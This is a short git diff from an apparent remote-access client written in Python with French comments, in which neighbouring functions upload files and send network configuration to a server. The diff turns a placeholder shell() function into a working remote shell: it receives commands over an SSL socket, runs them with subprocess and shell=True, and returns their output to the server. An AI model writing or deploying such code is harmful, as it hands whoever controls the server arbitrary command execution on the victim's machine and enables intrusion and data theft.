@@ -21,7 +21,13 @@ def upload(ssl_socket):
 
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
-    print('shell')
+    while True:
+        commande_shell_received = ssl_socket.recv(4096).decode()
+        if commande_shell_received.lower() == 'quit':
+            break
+        commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True)
+        commande_shell_to_send = commande_shell.stdout + commande_shell.stderr
+        ssl_socket.send(commande_shell_to_send.encode())
 
 # Fonction permettant d'envoyer la configuration réseau au serveur
 def ipconfig(ssl_socket):
